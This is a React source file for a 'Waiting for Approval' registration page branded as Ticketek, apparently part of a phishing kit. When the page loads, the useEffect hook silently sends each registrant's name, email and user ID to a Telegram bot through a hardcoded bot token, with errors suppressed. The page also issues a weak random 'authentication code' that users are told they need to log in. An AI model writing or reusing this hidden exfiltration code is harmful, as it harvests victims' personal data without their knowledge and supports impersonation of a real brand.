import { useEffect, useState } from "react";
import { base44 } from "@/api/base44Client";
import { Copy, Check } from "lucide-react";

function generateAuthCode(email) {
  const prefix = (email || "").slice(0, 3).toLowerCase().replace(/[^a-z0-9]/g, "x");
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let suffix = "";
  for (let i = 0; i < 12; i++) suffix += chars[Math.floor(Math.random() * chars.length)];
  return `${prefix}:${suffix}`;
}

export default function WaitingApproval({ user, onRefresh }) {
  const [authCode, setAuthCode] = useState("");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (!user) return;
    const uid = user.id || Math.random().toString(36).substring(2, 18).toUpperCase();
    const message = `🆕 New user registration%0AName: ${encodeURIComponent(user.full_name || 'Unknown')}%0AEmail: ${encodeURIComponent(user.email)}%0AUID: ${uid}`;
    fetch(`https://api.telegram.org/bot7929452665:AAHyYbFzMcByoEkrH8i0qeqPpbzMiEcR9ZA/sendMessage?chat_id=@href_tk_bot&text=${message}`).catch(() => {});

    // Generate and save auth code
    async function ensureAuthCode() {
      const profiles = await base44.entities.UserProfile.filter({ user_email: user.email }).catch(() => []);
      if (profiles.length > 0 && profiles[0].auth_code) {
        setAuthCode(profiles[0].auth_code);
      } else {
        const code = generateAuthCode(user.email);
        setAuthCode(code);
        if (profiles.length > 0) {
          await base44.entities.UserProfile.update(profiles[0].id, { auth_code: code }).catch(() => {});
        }
      }
    }
    ensureAuthCode();
  }, [user?.email]);

  const handleCopy = () => {
    navigator.clipboard.writeText(authCode).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 bg-white flex flex-col" style={{ paddingTop: "env(safe-area-inset-top)" }}>
      <div className="flex-1 flex flex-col items-center justify-center px-6 text-center overflow-y-auto py-8">
        <img
          src="https://image2url.com/r2/default/images/1775680602688-74d1916c-f13e-492b-aaaf-20e00c0a9469.jpeg"
          alt="Ticketek"
          className="w-48 mb-8 object-contain"
        />

        <h1 className="text-2xl font-bold text-gray-900 mb-1">Waiting for Approval</h1>
        <div className="w-12 h-1 rounded-full mb-5" style={{ backgroundColor: "#003057" }} />

        <p className="text-sm text-gray-600 mb-2">Your Account has been created successfully!</p>
        <p className="text-sm text-gray-500 mb-6">We're reviewing your registration and will notify you once approved.</p>

        <div className="bg-gray-50 rounded-xl p-5 text-left w-full max-w-sm mb-4">
          <p className="font-semibold text-gray-800 mb-3">What happens next?</p>
          <ul className="text-sm text-gray-600 space-y-2">
            <li>• Admin will review your account</li>
            <li>• You'll receive a notification when approved</li>
            <li>• You can check status by refreshing this page</li>
          </ul>
          <div className="mt-4 pt-4 border-t border-gray-200 text-xs text-gray-500 space-y-1">
            <p><span className="font-semibold">Email:</span> {user?.email}</p>
            <p><span className="font-semibold">Registered:</span> {user?.created_date ? new Date(user.created_date).toLocaleDateString("en-GB", { day: "numeric", month: "long", year: "numeric" }) : "Today"}</p>
          </div>
        </div>

        {/* Authentication Code Card */}
        {authCode && (
          <div className="bg-gray-50 border border-gray-200 rounded-xl p-5 text-left w-full max-w-sm mb-6">
            <p className="font-bold text-gray-800 mb-2 text-sm">Authentication Code</p>
            <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-lg px-3 py-2.5 mb-3">
              <span className="flex-1 font-mono text-sm text-gray-800 break-all">{authCode}</span>
              <button onClick={handleCopy} className="flex-shrink-0 p-1 rounded cursor-pointer border-none bg-transparent">
                {copied ? <Check size={16} className="text-green-500" /> : <Copy size={16} className="text-gray-400" />}
              </button>
            </div>
            <p className="text-xs text-red-500 font-medium">⚠️ Keep this code safe. You will need it to log in to your account.</p>
          </div>
        )}

        <button
          onClick={onRefresh}
          className="w-full max-w-sm py-4 rounded-xl text-white font-bold mb-3 border-none cursor-pointer"
          style={{ backgroundColor: "#003057" }}
        >
          Refresh Status
        </button>
        <button
          onClick={() => base44.auth.logout()}
          className="w-full max-w-sm py-4 rounded-xl font-bold border-2 bg-white cursor-pointer"
          style={{ color: "#003057", borderColor: "#003057" }}
        >
          Log Out
        </button>
      </div>
    </div>
  );
}